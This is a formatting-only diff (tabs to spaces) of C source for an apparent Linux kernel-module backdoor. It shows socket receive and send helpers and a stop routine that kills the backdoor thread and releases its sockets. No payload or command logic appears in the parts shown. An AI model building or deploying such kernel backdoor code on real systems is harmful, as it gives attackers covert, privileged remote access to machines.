@@ -7,33 +7,33 @@ struct kbackdoor_t *bkdoor = NULL;
 
 ssize_t backdoor_recv(struct socket *sock, uint8_t *buf, size_t len)
 {
-	struct msghdr msg;
-	struct kvec iov;
+  struct msghdr msg;
+  struct kvec iov;
   mm_segment_t oldfs;
-	size_t size = 0;
+  size_t size = 0;
 
-	if (sock->sk == NULL) { return -1; }
+  if (sock->sk == NULL) { return -1; }
 
   memset(&iov, 0, sizeof(struct iovec));
   memset(&msg, 0, sizeof(struct msghdr));
 
   // Setup IO vector for sock_recvmsg
-	iov.iov_base = buf;
-	iov.iov_len = len;
+  iov.iov_base = buf;
+  iov.iov_len = len;
 
-	msg.msg_name = &bkdoor->addr;
-	msg.msg_namelen = sizeof(struct sockaddr_in);
-	msg.msg_control = NULL;
-	msg.msg_controllen = 0;
-	msg.msg_flags = 0;
+  msg.msg_name = &bkdoor->addr;
+  msg.msg_namelen = sizeof(struct sockaddr_in);
+  msg.msg_control = NULL;
+  msg.msg_controllen = 0;
+  msg.msg_flags = 0;
 
   oldfs = get_fs();
   set_fs(KERNEL_DS);
-	size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
+  size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
   set_fs(oldfs);
   printk(KERN_INFO "Received %ld: %s\n", size, buf);
 
-	return size;
+  return size;
 }
 
 ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len)
@@ -48,8 +48,8 @@ ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len)
   memset(&msg, 0, sizeof(struct msghdr));
 
   // Setup IO vector for sock_recvmsg
-	iov.iov_base = buf;
-	iov.iov_len = len;
+  iov.iov_base = buf;
+  iov.iov_len = len;
 
   size = kernel_sendmsg(sock, &msg, &iov, 1, len);
   return size;
@@ -176,27 +176,27 @@ int backdoor_start(void)
 
 int backdoor_stop(void)
 {
-	int err = 0;
-	struct pid *pid = find_get_pid(bkdoor->thread->pid);
-	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+  int err = 0;
+  struct pid *pid = find_get_pid(bkdoor->thread->pid);
+  struct task_struct *task = pid_task(pid, PIDTYPE_PID);
 
   // TODO: Implement cleaner exit
-	// Kill backdoor
-	if (bkdoor->thread != NULL) {
-		err = send_sig(SIGKILL, task, 1);
+  // Kill backdoor
+  if (bkdoor->thread != NULL) {
+    err = send_sig(SIGKILL, task, 1);
     if (err > 0) {
-			while (bkdoor->running == 1)
-				msleep(50);
-		}
-	}
+      while (bkdoor->running == 1)
+        msleep(50);
+    }
+  }
 
   // Should wait for thread to receive the signals first
   // Close sockets
-	if (bkdoor->sock != NULL) {
+  if (bkdoor->sock != NULL) {
     kernel_sock_shutdown(bkdoor->sock, SHUT_RDWR);
-		sock_release(bkdoor->sock);
-		bkdoor->sock = NULL;
-	}
+    sock_release(bkdoor->sock);
+    bkdoor->sock = NULL;
+  }
   if (bkdoor->conn != NULL) {
     bkdoor->conn = NULL;
   }
